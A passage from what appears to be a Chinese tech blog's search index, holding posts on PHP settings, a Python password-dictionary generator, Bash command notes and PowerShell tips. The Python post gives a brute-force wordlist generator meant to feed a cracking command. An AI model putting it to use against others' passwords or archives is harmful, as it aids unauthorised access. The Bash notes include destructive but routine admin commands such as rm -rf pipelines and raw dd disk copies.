Found');}","link":"/2021/07/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/PHP%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%BB%A3%E7%A0%81/"},{"title":"PHP配置文件详解","text":"data.timezone顾名思义，时区。 一般设置为&quot;Asia/Shanghai&quot;，这样时间相关的函数就正确了。 我用ksweb的时候遇到过这个问题，当时竟然没想着改一下php.ini试试","link":"/2021/09/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/PHP%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/"},{"title":"用Python写一个字典生成器","text":"序言 你知道52的7次方有多大吗？我算过，如果存储这么多个7位密码，大概需要13TiB的存储空间。 这就是我写了两个版本字典生成方法的原因：如果真的要全部生成完再去跑字典，那几乎是不可能的事。 算法1：for循环递归这是一个相当简单粗暴的算法。 12345678910111213def gen_with_for(length, letters, result = ''): length = int(length) letters = str(letters) if length == 1: ls = [] for i in letters: ls.append(result+i) return ls else: ls = [] for i in letters: ls += gen_with_for(length-1,letters,result+i) return ls 这个算法优点就是简单。只需要知道密码长度，密码包含的所有字符就可以穷举出所有组合。 不过缺点也很明显。随着循环层数的增加，最内层循环次数指数级增加。如果密码稍长一点，电脑内存可能就炸了。 算法2：进制转换穷举密码的本质，其实也就是将对应的十进制数转换成用一些符号表达的p进制数。 1234567def gen_with_convert(number, letters): length = len(letters) result = '' while number: number, rest = divmod(number-1, length) result = letters[rest] + result return result 相比前一个算法，这个算法虽然慢一些，但是内存占用不会像前一个那么嚣张（ 不过，我要生成所有7位含52个符号的密码，需要从第几个密码开始生成呢？ 我也不知道。所以，我又写了这个函数。 1234def loop_time_calc(length, l_length): if length == 0: return 1 return pow(l_length, length) + loop_time_calc(length -1, l_length) 这样，就大大简化了调用过程。同时因为密码是逐个返回的，所以完全可以把它和破解指令丢在同一个for里，破解和生成同步进行，可以减少破解耗时。 完整版是这样： 12345678910111213141516171819202122232425262728293031#!/usr/bin/pythonimport optparsedef gen(number, letters): length = len(letters) result = '' while number: number, rest = divmod(number-1, length) result = letters[rest] + result return resultdef loop_time_calc(length, l_length): if length == 0: return 1 return pow(l_length, length) + loop_time_calc(length -1, l_length)def main(): parse = optparse.OptionParser(&quot;Param: -l &lt;Length&gt; -c &lt;Characters&gt;&quot;) parse.add_option(&quot;-l&quot;, dest=&quot;length&quot;, help=&quot;get password length&quot;) parse.add_option(&quot;-c&quot;, dest=&quot;characters&quot;, help=&quot;get characters in password&quot;) (options, args) = parse.parse_args() if (options.length == None) | (options.characters == None): print(parse.usage) else: length = options.length characters = options.characters _s, _e = loop_time_calc(int(length)-1,len(characters)), loop_time_calc(int(length),len(characters)) for i in range(_s, _e): print(gen(i, characters))main() 调用格式： 1root@xeonds:~# ./pass_gen.py -l 4 -c 0123456789 &gt; pass.txt 上面的指令生成所有四位纯数字密码。 所以说纯数字密码不安全嘛.jpg（ 小结用[[Python|Python]]做这种东西很方便。不过在解密压缩包上，已经有很好用的HashCat了。 就算法方面来说，说到底，还是要数学好嘛（摊）。进制转换好像小学奥数就有讲？无所谓，反正我已经忘了（逃","link":"/2021/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/%E7%94%A8Python%E5%86%99%E4%B8%80%E4%B8%AA%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%99%A8/"},{"title":"Bash学习笔记","text":"Bash对于绝大多数任务来说够用。所以没必要太折腾，先试试Bash吧。 第一部分我会记录一些Linux自带（绝大多数情况）程序的用法，第二部分会把它们组合起来使用。 命令介绍数据操作类指令head命令用于显示文件的开头几行，sort命令用于对文件或标准输入进行排序，可以按照字母顺序、数字大小、日期等方式进行排序，uniq命令则用于去除重复的行，可以通过参数指定只保留重复行的数量或只显示重复行。 head命令的语法：head [选项] [文件]。例如，要查看文件file.txt的前10行，请使用以下命令：head -n 10 file.txt。¹\\ sort命令的语法：sort [选项] [文件]。例如，要按字母顺序对文件file.txt进行排序，请使用以下命令：sort file.txt。要按数字大小对文件进行排序，请使用以下命令：sort -n file.txt。 uniq命令的语法：uniq [选项] [输入文件] [输出文件]。例如，要从文件file.txt中删除重复的行并将结果写入新文件newfile.txt，请使用以下命令：uniq file.txt newfile.txt。要显示重复行及其出现次数，请使用以下命令：uniq -c file.txt。 tee：用于分叉管道流的工具。管道符|就像一节节不透明的水管一样将输入流运送到输出流中，而tee就是这么一个工具，它就像一个Y型管道一样，可以将前一级的输入分叉到另一个路径上，并让输入的数据流原封不动地送往管道流的下一级。 Bash的语法bash的一行语句结尾可以写分号;，也可以不写。用分号可以将多条指令串联起来运行，比如cmd1; cmd2; cmd3; ... 它的管道是一个相当好用的东西，可以将几个命令的输入输出相互串起来，得到一个组合后的工具，并且管道是系统级工具，因此十分灵活且高效。比如cmd1 | cmd2 | xargs cmd3 | ...。 这里的xargs是另一个工具，它可以将它得到的stdin转化成后面跟随指令的参数列表。比如find . -type f -name &quot;* *&quot; -print0 | xargs -0 rm -f，它就可以将符合条件的文件作为一个参数列表传递给rm -f指令。另外，这里的-0是告诉xargs，在读入stdin时，使用 null 作为分隔符。 除了管道和分号，还有&amp;&amp;，也可以连接多条指令。它和分号类似，不过区别是它会检查前一条指令的运行结果（返回值），并且根据这个来决定是否运行下一条指令。例如，cmd1 &amp;&amp; cmd2 &amp;&amp; cmd3，这样写的话，只要任意一个指令运行失败，那么它之后的所有指令都会不执行，这样可以有效防止发生一些难以预料的情况。 Bash的快捷键除了语法，Bash还有很多很实用的快捷键作为功能扩展。我到今天都保持默认shell为Bash很大程度就是因为我发现这些功能相当完善，可以解决大部分的日常需求。什么，你还有需求？那为啥不先试试写个脚本搞定？脚本太麻烦/不想造轮子再试试其他工具嘛。以前用过zsh，fish之类的带有很强大的completion的shell，用久了发现启动性能/语法兼容性的问题大于我对功能的需求，遂弃之。 ctrl-x, ctrl-e：将当前输入映射到编辑器里，关闭编辑器后自动执行。这功能不用我解释，评价是特别好用。 ctrl-a/e：跳转到行首/行尾，ctrl-w删除一个词。 ctrl-r：搜索指令，输入关键词，在histoty里边查找对应命令。一定程度上算completion的补全吧，也很好用。 一些工具grep References:grep命令 – 强大的文本搜索工具 Global search Regular Expression and Print out the lines。常用工具，虽然现在有不少替代品，不过作为基础设施之一，学了到处都能用是它最大的好处。 它的语法很简单，grep [参数] [正则表达式] &lt;文件名&gt;，也可以缺省文件名让它从输入管道中读取数据流。 参数 功能 -b 显示匹配行距文件头部的偏移量 -o 显示匹配词距文件头部的偏移量 -c 只显示匹配的行数 -q 静默执行模式 -E 支持扩展正则表达式 -r 递归搜索模式 -F 匹配固定字符串的内容 -s 不显示没有匹配文本的错误信息 -h 搜索多文件时不显示文件名 -v 显示不包含匹配文本的所有行 -i 忽略关键词大小写 -w 精准匹配整词 -l 只显示符合匹配条件的文件名 -x 精准匹配整行 -n 显示所有匹配行及其行号 更多详细的用法可以参考man。 wget参数众多的下载工具，从建立镜像站到带cookie下载都能完成。 Non-interactive: Wget can operate in the background, allowing you to initiate a download and disconnect from the system while it completes the task. Recursive downloading: Wget can create local copies of entire websites, preserving the original directory structure. Link conversion: It can convert links in downloaded files to point at local files for offline viewing. Time-stamping: Wget checks if remote files have changed since the last retrieval and automatically fetches updated versions. Respects Robot Exclusion Standard: Wget adheres to /robots.txt rules. Parameter Function -r Recursive download (download entire directories) -O &lt;filename&gt; Save downloaded file with a specific name -nc Skip download if file already exists -np Don’t ascend to parent directories -P &lt;directory&gt; Save files to a specific directory -q Quiet mode (suppress output) -c (or --continue) Resume a partially downloaded file. -i &lt;file&gt; Read URLs from a file and download them. -k (or --convert-links) Convert links in downloaded files to point at local files. -t &lt;number&gt; Set the number of retries for failed downloads. -U &lt;agent-string&gt; Set the User-Agent header for HTTP requests. -e &lt;command&gt; Execute a command after downloading. -x Force directories to be created even if they don’t exist. -l &lt;depth&gt; Specify the maximum recursion depth. -A &lt;accept-list&gt; Accept only files with specific extensions. -R &lt;reject-list&gt; Reject files with specific extensions. --limit-rate=&lt;rate&gt; Limit download speed (e.g., --limit-rate=1M). GNU Wget Manual Linux man page for wget Stack Overflow: wget with GET parameters pdftk一个用来处理pdf的工具箱。目前我的用法主要是连接多个pdf： 1pdftk 1.pdf 2.pdf cat output sum.pdf 下面是pdftk的帮助手册，可以参照： 12345678910111213141516171819202122232425SYNOPSIS pdftk &lt;input PDF files | - | PROMPT&gt; [ input_pw &lt;input PDF owner passwords | PROMPT&gt; ] [ &lt;operation&gt; &lt;operation arguments&gt; ] [ output &lt;output filename | - | PROMPT&gt; ] [ encrypt_40bit | encrypt_128bit | encrypt_aes128 ] [ allow &lt;permissions&gt; ] [ owner_pw &lt;owner password | PROMPT&gt; ] [ user_pw &lt;user password | PROMPT&gt; ] [ flatten ] [ need_appearances ] [ compress | uncompress ] [ keep_first_id | keep_final_id ] [ drop_xfa ] [ drop_xmp ] [ replacement_font &lt;font name&gt; ] [ verbose ] [ dont_ask | do_ask ] Where: &lt;operation&gt; may be empty, or: [ cat | shuffle | burst | rotate | generate_fdf | fill_form | background | multibackground | stamp | multistamp | dump_data | dump_data_utf8 | dump_data_fields | dump_data_fields_utf8 | dump_data_annots | update_info | update_info_utf8 | attach_files | unpack_files ] libreoffice最近用这东西在命令行里做ppt转pdf，特别方便： 1libreoffice --headless --invisible --convert-to pdf *.ppt tmux强大够用的终端复用工具，或者说是tui多窗口管理工具twm（不是 快捷键 &lt;c-b&gt; &lt;c-c&gt;：在tmux中创建新的session &lt;c-b&gt; c：在tmux中创建新的window ranger今天用的时候忘名字了）记录一下 一个终端下的tui文件管理器，部分支持Vim键位。 tokei也是忘了名字了，一个代码行数统计工具。 httpie能替代curl的，用来发送http请求的一个小工具。比如可以这么用： 123456http --json POST http://example.com/api/resource &lt;&lt;EOF{ &quot;name&quot;: &quot;John Doe&quot;, &quot;age&quot;: 30}EOF 来向后端发送一个请求。 curl或者用curl也挺好的： 1234curl -X POST // 指定请求方法 -H &quot;application/json&quot; // 指定请求头 -H &quot;Authorization: xxxxxx&quot; -d '{&quot;key&quot;: &quot;value&quot;}' // 请求体数据 github-cli二进制文件名称是gh，是github官方推出的命令行版github客户端。 1sudo pacman -S github-cli 一些用法黑魔法开始了（不是 Bash自身的快捷键指令编辑 c-x, c-e 在编辑器中编辑命令并在编辑器退出后执行命令，配合export EDITOR=vim c-a/e 行首/行尾 c-w 以空格为分隔删除单词 统计输出情况1./a.out | head -n 100000 | sort | uniq -c 这样就能得到统计好的输出数据。 随机输出一行看到同学发的抽奖现场用Python现写程序，节目效果拉满（）不过，都用Linux了，还不用Bash？ 1fname=&quot;lab6.c&quot;; rand=$((RANDOM%$(cat &quot;$fname&quot; | wc -l))); sed -n &quot;$rand&quot;p &quot;$fname&quot; 上面的命令其实是3行命令，但是每行都比较短就合成一行了。第一个和第二个都是赋值命令，设置文件名，并根据文件行数生成随机数。第三行用sed从文件中读取指定的行。 对于第三行指令，其实不用sed也行，用head -n &quot;$rand&quot; | tail -n 1&quot;也是能得到相同的结果。完整指令： 1fname=&quot;lab6.c&quot;; rand=$((RANDOM%$(cat &quot;$fname&quot; | wc -l))); cat $fname | head -n &quot;$rand&quot; | tail -n 1 总之能看出，对于操作数据，Linux自带的工具也很强大了。 保留最近三天的文件这东西用来清log和冗余备份确实好用。 清文件夹记得把-f换成-rf。 1find [target file in path] -mtime +2 |xargs rm -f Ubuntu内存释放 2020.12.18 11:05:00 下面的指令用来释放系统内存，只在Ubuntu上测试过。长期运行的服务器最好严密监督内存使用情况： 1echo 3 &gt;/proc/sys/vm/drop_caches 啊对了注意指令里是vm不是mv。 ln-强大的软链接工具常用用法： 1ln –s 源文件 软连接文件 这可以帮我们把一个文件链接到另一个地方，类似Windows的快捷方式。 我一般会用它把正在开发的项目链接到nginx的目录下，来实时预览效果。 端口占用解除有时候一些网络应用会启动失败，提示端口被占用。那么一般怎么解决呢？ 系统环境我的系统是Ubuntu20.04，其他Linux应该也大同小异。 解决步骤就两步。先找到进程： 1netstat -anlp| grep 端口号 然后结束进程： 1kill -9 进程pid 完事儿。 或者可以用awk和管道把命令缩短到一行： 1netstat -anlp | grep 3000 | awk '{print $7}' | awk -F '/' '{print $1}' | xargs kill -9 不太好看但是还挺方便。起码手不疼了（ nc用nc可以进行局域网聊天（不是 用 socat 还可以群聊： 局域网内所有 Linux 机器，输入下方命令加入群聊（指 UDP 广播）（狗头）（狗头） 1socat - UDP-DATAGRAM:255.255.255.255:12345,broadcast,bind=0.0.0.0:12345 根据nginx日志自动ban异常IP12345678910111213141516#!/bin/bash line=1000 times=10 conf=/opt/nginx/conf/blockip.conf tail /data/logs/nginx/access.log -n $line | \\ grep -E '(&quot;status&quot;:&quot;404&quot;|&quot;status&quot;:&quot;302&quot;)' | awk '{print $1}' | \\ sort | uniq -c | \\ awk '$1&gt;$times{print &quot;deny &quot;$2 &quot;;&quot;}' &gt;&gt; $conf deny=$(sort $conf | uniq -c | awk '{print &quot;deny &quot;$3}') echo $deny | sed &quot;s/; /;\\n/g&quot; &gt; $conf /usr/local/sbin/nginx -t || exit /usr/bin/systemctl reload nginx 一些小工具lazygit ，Git 的终端界面ranger ，终端文件管理器lolcat ，对输出做渐变色处理trash ，mv 的垃圾回收站版本icdiff ，diff 的样式改进版本lsd ，带文件类型图标的 ls 跟踪某网页特定内容123456789101112#!/bin/bashurl=&quot;http://v2ex.com&quot;want=&quot;好玩&quot;wget &quot;$url&quot; -O contentsif result=$(cat contents | ack -i &quot;$want&quot;)then echo &quot;$result&quot; | mail -s &quot;Notification&quot; youe@mail.comelse echo &quot;nothing&quot;fi 空间查看最近经常在用这个指令查看空间使用情况： 1du -sh ./* 2&gt;/dev/null | sort -u 比如看下缓存占用情况啥的： 1234567891011121314❯ sudo du -sh ./* 2&gt;/dev/null | sort -u0 ./motd-news1.4M ./apparmor2.0M ./man20K ./snapd228K ./fontconfig3.8M ./debconf32K ./ldconfig4.0K ./pollinate4.0K ./private8.0K ./PackageKit8.0K ./apache28.0K ./app-info971M ./apt 用PushPlus集成事件通知服务这个脚本读取第一，二个命令行参数，然后发送通知。可以跟其他工具串一块，简单实现服务器监控报警功能： 1234567#!/bin/bashtoken=PUSH_PLUS_TOKENurl=http://www.pushplus.plus/sendjson=&quot;{\\&quot;token\\&quot;: \\&quot;$token\\&quot;, \\&quot;title\\&quot;: \\&quot;$1\\&quot;, \\&quot;content\\&quot;: \\&quot;$2\\&quot;}&quot;curl -H &quot;Content-Type: application/json&quot; -X POST -d &quot;$json&quot; $url 单行脚本： 1tail -F /var/log/syslog | grep -E --line-buffered &quot;error|fail|warn&quot; | while read line; do bash /path/to/pushplus.sh &quot;服务器异常日志&quot; &quot;$line&quot;; done 效果如下： 测试就完成了。然后直接nohup丢到后台，就能很方便地实现异常告警了。 集成到crontab 用了一段时间之后，发现是挺舒服，配合crontab定时触发更是自动运维的好东西。 假设有一个运维工具将信息直接输出到stdout，那么我们可以在crontab里这么写： 1output=$(/path/to/script.sh); pushplus &quot;自动任务完成&quot; &quot;$output&quot; 不过得先将上面的pushplus.sh去掉后缀放在/usr/local/bin/之类的地方才能全局使用。 文本文件合并This is technically what cat (“concatenate”) is supposed to do, even though most people just use it for outputting files to stdout. If you give it multiple filenames it will output them all sequentially, and then you can redirect that into a new file; in the case of all files just use ./* (or /path/to/directory/* if you’re not in the directory already) and your shell will expand it to all the filenames (excluding hidden ones by default). 1$ cat ./* &gt; merged-file Make sure you don’t use the csh or tcsh shells for that which expand the glob after opening the merged-file for output, and that merged-file doesn’t exist before hand, or you’ll likely end up with an infinite loop that fills up the filesystem. The list of files is sorted lexically. If using zsh, you can change the order (to numeric, or by age, size…) with glob qualifiers. To include files in sub-directories, use: 1find . ! -path ./merged-file -type f -exec cat {} + &gt; merged-file Though beware the list of files is not sorted and hidden files are included. -type f here restricts to regular files only as it’s unlikely you’ll want to include other types of files. With GNU find, you can change it to -xtype f to also include symlinks to regular files. With the zsh shell, 1cat ./**/*(-.) &gt; merged-file Would do the same ((-.) achieving the equivalent of -xtype f) but give you a sorted list and exclude hidden files (add the D qualifier to bring them back). zargs can be used there to work around argument list too long errors. 更改时区今天看系统日志的时候发现时间不太对，估计应该是没设置对时区。所以就记录一下。只需要一行： 12345sudo timedatectl set-timezone Asia/Shanghai# 如果要查看所有可用时区的话timedatectl list-timezones# 查看当前时区信息timedatectl 或者也可以用创建符号链接的方式更改： 12sudo rm -rf /etc/localtime &amp;&amp; \\sudo ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 监控硬盘状态信息借助smartctl就能做到。这工具输出十分丰富，还能跑硬盘测试，这里演示下最简单的用法： 1234for DEVICE in &quot;sda sdb sdc&quot;; do smartctl -a $DEVICE | \\ grep 'SMART overall-health self-assessment test result'done 加强版，输出报告： 1234567891011121314151617181920212223242526#!/bin/bashSMARTCTL=&quot;smartctl&quot;DEVICES=&quot;sdb sdc&quot;get_model() { DEVICE=$1 $SMARTCTL -i $DEVICE | grep &quot;Device Model&quot; | awk '{print $3}'}check_disk() { DEVICE=$1 MODEL=$(get_model $DEVICE) STATUS=$($SMARTCTL -a $DEVICE | grep 'SMART overall-health self-assessment test result') RESULT=$(echo $STATUS | awk '{print $NF}') if [ &quot;$RESULT&quot; != &quot;PASSED&quot; ]; then ALERTS=&quot;$ALERTS\\n硬盘异常：$DEVICE ($MODEL)\\n$STATUS\\n&quot; # 追加到变量中，用换行符分隔不同的硬盘信息 else ALERTS=&quot;$ALERTS\\n硬盘正常：$DEVICE ($MODEL)\\n$STATUS\\n&quot; # 追加到变量中，用换行符分隔不同的硬盘信息 fi}ALERTS=&quot;&quot;for DEV in $DEVICES; do check_disk /dev/$DEVdoneecho &quot;$ALERTS&quot; 批量压缩基本就是个用ls和awk组装起来的工具，没啥技术含量。使用时会把目录下的所有东西压缩为以文件为名的压缩包： 1ls | awk '{print &quot;zip -r \\&quot;&quot; $0&quot;.zip\\&quot; \\&quot;&quot;$0&quot;\\&quot;&quot;}' | bash 图片生成 JYY的奇妙课堂.jpg Linux原生支持PPM图片(Portable Pixel Map)格式。它的结构很简单： 1234P6 // magic numberWIDTH HEIGHTMAX COLOR // number of single color, mostly be 255...PIXELS // pixels 每一个像素都是一个结构体，存储了图像的rgb信息： 1234// A struct to represent a RGB pixeltypedef struct { unsigned char r, g, b;} Pixel; 所以，理论上可以直接手写二进制写出一张图片，或者用C实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;// Define the image dimensions and the maximum color value#define WIDTH 200#define HEIGHT 100#define MAX_COLOR 255// A struct to represent a RGB pixeltypedef struct { unsigned char r, g, b;} Pixel;// A function to write a PPM image to a filevoid write_ppm(const char *filename, Pixel *image) { // Open the file for writing in binary mode FILE *fp = fopen(filename, &quot;wb&quot;); if (!fp) { fprintf(stderr, &quot;Error: cannot open file %s\\n&quot;, filename); exit(1); } // Write the PPM header fprintf(fp, &quot;P6\\n&quot;); // Magic number for binary PPM fprintf(fp, &quot;%d %d\\n&quot;, WIDTH, HEIGHT); // Image width and height fprintf(fp, &quot;%d\\n&quot;, MAX_COLOR); // Maximum color value // Write the pixel data fwrite(image, sizeof(Pixel), WIDTH * HEIGHT, fp); // Close the file fclose(fp);}// A function to create a gradient imagevoid create_gradient(Pixel *image) { // Loop over each pixel for (int y = 0; y &lt; HEIGHT; y++) { for (int x = 0; x &lt; WIDTH; x++) { // Compute the pixel index int i = y * WIDTH + x; // Set the pixel color based on its position image[i].r = x * MAX_COLOR / WIDTH; // Red component image[i].g = y * MAX_COLOR / HEIGHT; // Green component image[i].b = (x + y) * MAX_COLOR / (WIDTH + HEIGHT); // Blue component } }}// The main functionint main() { // Allocate memory for the image Pixel *image = malloc(sizeof(Pixel) * WIDTH * HEIGHT); if (!image) { fprintf(stderr, &quot;Error: cannot allocate memory for the image\\n&quot;); exit(1); } // Create the gradient image create_gradient(image); // Write the image to a file write_ppm(&quot;gradient.ppm&quot;, image); // Free the memory free(image); return 0;} 完成之后，可以用ImageMagick的convert gradient.ppm gradient.jpg将图片转换成jpg格式的图片。 rsync的使用 好东西，比scp好用 12345# 同步多个文件/文件夹到远程服务器目录rsync -av files-or-dirs user@remote-server:/path/to/destination/# 如果远程服务器的ssh端口不是默认22rsync -av -e &quot;ssh -p PORT_NUMBER&quot; files-or-dirs user@remote-server:/path/to/destination/ 其中的-a代表archive，-v代表verbose。它的优点在于能够断点续传，以及增量同步。这样的特性使得它在镜像站搭建上也有重要地位。 另外，还可以结合find来做批量文件处理。比如我要将递归地将当前目录下所有以DCIM命名的文件夹合并到当前目录下，那么只需要： 123find . -type d -name &quot;DCIM&quot; \\ -exec rsync -av --ignore-existing {}/ ./DCIM/ \\ -exec rmdir {} 上面的指令先找到所有名为DCIM的目录，然后使用rsync将所有文件合并到当前目录的DCIM目录中，最后使用rmdir删除其他无用文件夹。 设备转发要通过网络将一台电脑（我们称之为电脑A）上的串行端口/dev/ttyUSB0映射到另一台电脑（我们称之为电脑B）上，可以使用socat工具来完成。以下是在两台电脑上各自需要的命令： 在电脑A上电脑A需要将其串行端口/dev/ttyUSB0转发到TCP网络连接上。假设电脑A的IP地址为192.168.1.10，并且我们选择使用TCP端口7777来进行转发，可以使用以下命令： 1socat /dev/ttyUSB0,raw,echo=0 TCP-LISTEN:7777,reuseaddr 这条命令做了以下几件事： /dev/ttyUSB0,raw,=0：选择/dev/ttyUSB0设备，raw表示原始输入输出模式，echo=0表示关闭回显。 -LISTEN:7777,reuseaddr：在TCP端口7777上监听进来的连接请求，reuseaddr允许在同一端口重启监听服务而不会因为端口被占而出错。 在电脑B上电脑B需要从网络连接接收数据，并将其映射到一个虚拟的串行端口。我们可以使用socat来创建一个伪终端（pty），并从电脑A的7777端口接收数据： 1socat PTY,link=/dev/ttyVUSB0,raw,echo=0 TCP:192.168.1.10:7777 这条命令的作用如下： PTY,link=/dev/ttyVUSB0,raw,echo=0：创建一个新的伪终端设备，链接（命名）为/dev/ttyVUSB0，并设置为原始模式，关闭回显。 TCP:192.168.1.10:7777：连接到电脑A的IP地址192.168.1.10上的TCP端口7777。 通过这样的设置，电脑B上的应用程序可以通过//ttyVUSB0与电脑A上的/dev/ttyUSB0设备进行通信，就像直接连接在一起一样。请确保网络连接稳定，并在需要的情况下调整IP地址和端口设置。 文件管理这是CLI对GUI的一次薄纱。 按规则重命名所有文件例如我想移除当前目录下所有文件的.前缀，我就可以使用这样的命令： 1for file in .*; do [ -f &quot;$file&quot; ] &amp;&amp; mv &quot;$file&quot; &quot;${file#.}&quot;; done 还能扩展出更多的用法： 重命名文件: ${file#.}可以移除文件名的前导字符 路径修改: 可以从全路径移除特定的路径。比如${full_path#/path/to/}可以变换路径为相对路径 修改/删除文件后缀: ${file%.*}会删除文件的后缀，比如文件名是document.pdf,${file%.*}就是document 替换文件名: ${parameter/pattern/replacement}：比如${file/.old./.new.}能把文件名的.old.换为.new. find这一个指令的用法就值得讲半天。find是查找指定路径下匹配文件的有用工具，同时还能对已有的文件执行自定义的操作。最简单的用法就是查找文件： 1find . -type f -name test*.md 如果要匹配多个正则求并集可以这么做： 1find . -type f -name *.a -o -name *.b -o -name *.c 它会给出匹配的文件列表。然后使用其他工具处理就行，或者可以用-exec参数处理文件列表（后边再说 目录去重众所周知diff能用于数据比对，比对结果可以存储为patch来方便地描述源文件的更改，同时也能在传输时节省流量，不用把整个文件重新传过去等。 diff的一个参数是-q，可以用于递归比对两个目录： 1diff -q &quot;$folder1&quot; &quot;$folder2&quot; | grep &quot;Only in $folder2&quot; | awk -F': ' '{print $2}' | xargs rm -rf 下面的指令比对第一个目录和第二个目录的不同，并删去第一个目录中相比于第二个目录多出的部分。 数据操作coreutils里边不少工具都是玩字符串魔术，也就是字符串处理的。这不光对于编写各宗脚本很有用，甚至在处理数据上也相当有用。特别是面对一些格式很奇怪的数据，现场找不到parser的那种，你几乎可以正则+批量操作秒了，不能秒怎么办？别急，这不还有awk嘛。说到这玩意，这既是个程序，也是个编程语言。它像python那样，既能用命令化的方式编辑文件，也能编写awk脚本来作为文件批量编辑的工具。 文件按日期排序刚好要给博客系统写个脚本来增加个最近文件功能。所以就写了个脚本来首先获取一个按照日期排序的文件列表。做法很简单，就是那几样老工具继续组合，不过参数倒是挺新的，因为ls我平时用的时候几乎就没加过参数（） 123456find . -type f -name &quot;*.md&quot; -print0 |\\ xargs -0 stat -c &quot;%w %n&quot; |\\ sort -n |\\ cut -d' ' -f4 |\\ head -n 20 一个find用来找出匹配文件路径，一个stat转换为日期+时间的形式，剩下的就是排序和字符串操作了。另外如果想倒序输出的话（从最新到最旧输出文件列表），只需要给sort加个-r参数逆向排序就行了。 把这东西加到我博客里边之后基本是这效果： 123456789xeonds@localhost# cd blogWelcome back to blog, write something?Recent 5 files:./_posts/计算机科学/编程语言/Script/Bash学习笔记.md./_posts/计算机科学/计算机视觉/计算机视觉学习笔记.md./_posts/计算机科学/编程语言/JavaScript/记一次npm和nodejs安装过程.md./_posts/计算机科学/开发工具/VScode使用笔记.md./_posts/flutter-intro.mdxeonds@localhost# 其实现在Obsidian用的少了，反而是Vim用的更多了。一个是Vim性能和资源占用上确实能吊着前者打，另一个是Obsidian对于Vim的支持还是比较有限和割裂（比如&lt;Ctrl+C&gt;和&lt;Ctrl+V&gt;的处理，比如中文输入法的支持，在我这边的感知是达不到原生Vim的体感的）。不过Vim这边怎么复制粘贴图片是个大问题，不过有必要不咕咕咕的话，也许写个脚本也能搞定。 进制转换Bash里边有个printf调用，好像是shell内建的POSIX标准命令。也是突然想起来能这么用的： 1printf '%x\\n' 2024 或者，也可以用bc或者dc解决： 1234$ echo 'obase=16; 9999999999999999999999' | bc21E19E0C9BAB23FFFFF$ echo '16o 9999999999999999999999 p' | dc21E19E0C9BAB23FFFFF ref:BASH base conversion from decimal to hex 使用标准输入输出流 POSIX Utility Syntax Guidelines, §12.2.13 of The Open Group Base Specifications:For utilities that use operands to represent files to be opened for either reading or writing, the ‘-‘ operand should be used only to mean standard input (or standard output when it is clear from context that an output file is being specified). 从效果来看，命令最后跟随的-类似一个占位符，代表这个命令要处理的一个文件。这个占位符表示，明确将stdin/stdout作为所占位置的文件。比如你可以给一些文件操作命令最后加上-来表示文件，它就会将原本要写入文件的内容输出到屏幕上/从命令行读取原本作为输入的文件（的内容）。 有了它，我们就能玩出来一些有意思的花样： 压缩一个文件，边压缩边将文件传输到另一个设备： 1tar -cjf - /path/to/directory-or-file | ssh user@hostname dd of=/path/to/destination/name-of-archive.tar.bz2 这个命令首先使用bzip2压缩文件，只不过将压缩后的文件借助-占位符输出到了stdout，然后借助管道符|将压缩好的文件数据传送到下一个命令。 对于下一个命令，首先要知道它是ssh的一种用法，就是在登陆后直接执行一条命令然后退出，所以这条命令就是先连接到目标设备上，然后执行dd of=/path/2/fname来将文件写入到指定的位置。其中的dd of=也是dd的缺省用法，当stdin有输入时，就可以省略if=这个参数。 备份远程linux设备全盘到当前设备 在另一篇ESXi折腾小记里边我写过这种用法，一并记录到这里。 1ssh username@server_ip &quot;sudo dd if=/dev/sdX bs=4M status=progress&quot; | dd of=/path/to/local/backup/server_root.img bs=4M 调换一下本地和远程设备也没问题： 1sudo dd if=/dev/sdX bs=4M | ssh username@server_ip &quot;dd of=/path/2/server_disk.img bs=4M status=progress&quot; 或者想在传输过程中对数据流压缩一下，在中间插个管道就行： 1ssh x-server-local &quot;sudo -S dd if=/dev/sda2 bs=4M status=progress&quot; | bzip2 -c | dd of=sever-backup.img bs=4M 解压的时候管道反过来用就行： 1dd if=server-backup.img bs=4M status=progress | bzip2 -c | ssh x-server-local &quot;sudo -S dd of=/dev/sda2 bs=4M&quot;","link":"/2023/06/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Script/Bash%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"PowerShell学习笔记","text":"文件批量改后缀1dir * | foreach { Rename-Item $_ -NewName ($_.BaseName+”.mp4”) } 解除端口占用首先找到占用端口的进程，然后终止进程： 12netstat -nao | findstr &quot;5554&quot; # 假设5554端口被占用taskkill -pid 5076 -f # 结束占用进程 查找文件如果不指定Path则默认查找当前目录。查找支持正则表达式。 1Get-ChildItem -Path C:\\Users\\JohnDoe -Filter *.txt -Recurse 批量git push1234567Get-ChildItem -Directory | ForEach-Object { $gitDir = Join-Path $_.FullName &quot;.git&quot; if (Test-Path $gitDir) { Set-Location $_.FullName git push 